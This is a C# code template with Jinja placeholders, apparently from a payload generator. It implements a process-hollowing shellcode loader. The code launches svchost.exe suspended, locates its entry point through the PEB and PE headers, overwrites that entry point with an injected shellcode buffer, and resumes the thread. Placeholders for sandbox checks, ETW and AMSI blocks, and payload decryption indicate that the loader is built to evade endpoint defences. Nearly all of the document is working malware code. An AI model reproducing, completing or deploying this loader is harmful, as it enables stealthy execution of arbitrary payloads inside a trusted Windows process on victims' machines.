using System;
using System.Runtime.InteropServices;
{{ crypto_using }}

namespace {{ namespace }}
{
    class {{ classname }}
    {
        const uint CREATE_SUSPENDED = 0x4;
        const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct ProcInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct StartInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct ProcBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartInfo lpStartupInfo, out ProcInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
{{ amsi_imports }}

        static void Main(string[] args)
        {
{{ sandbox_block }}
{{ etw_block }}
{{ amsi_block }}
            {% if is_encrypted %}
            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
            {% else %}
            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
            {% endif %}
{{ decrypt_block }}

            // hollow svchost
            StartInfo si = new StartInfo();
            ProcInfo pi = new ProcInfo();
            bool ok = CreateProcess(null, "c:\\windows\\system32\\svchost.exe",
                IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            ProcBasicInfo pbi = new ProcBasicInfo();
            uint retLen = 0;
            ZwQueryInformationProcess(pi.hProcess, PROCESSBASICINFORMATION, ref pbi,
                (uint)(IntPtr.Size * 6), ref retLen);

            // read image base from PEB + 0x10
            IntPtr imgBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
            byte[] addrBuf = new byte[0x8];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(pi.hProcess, imgBaseAddr, addrBuf, addrBuf.Length, out nRead);
            IntPtr execAddr = (IntPtr)BitConverter.ToInt64(addrBuf, 0);

            // read PE headers to find entrypoint
            byte[] hdrBuf = new byte[0x200];
            ReadProcessMemory(pi.hProcess, execAddr, hdrBuf, hdrBuf.Length, out nRead);
            uint lfanew = BitConverter.ToUInt32(hdrBuf, 0x3c);
            uint rva = BitConverter.ToUInt32(hdrBuf, (int)(lfanew + 0x28));
            IntPtr entrypoint = (IntPtr)((Int64)execAddr + rva);

            // overwrite entrypoint and resume
            IntPtr nWritten = IntPtr.Zero;
            WriteProcessMemory(pi.hProcess, entrypoint, buf, buf.Length, out nWritten);
            ResumeThread(pi.hThread);
        }
    }
}
